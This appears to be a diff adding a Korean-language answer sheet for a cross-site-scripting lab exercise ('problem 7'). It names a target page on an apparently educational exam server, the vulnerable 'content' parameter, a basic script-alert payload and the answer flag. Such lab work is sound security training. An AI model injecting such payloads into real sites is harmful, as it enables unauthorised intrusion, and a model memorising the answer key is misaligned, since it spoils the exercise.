@@ -1,0 +1,13 @@
+XSS 7번 문제
+
+1. 공격구문 삽입 URL:
+https://elms2.skinfosec.co.kr:8083/exam21/faqwrite.php
+
+2. 파라미터명과 공격구문:
+
+파라미터명: content
+공격구문: <p>Hello<script>alert('XSS')</script></p>
+
+3. 정답: 
+javascript_xss
+
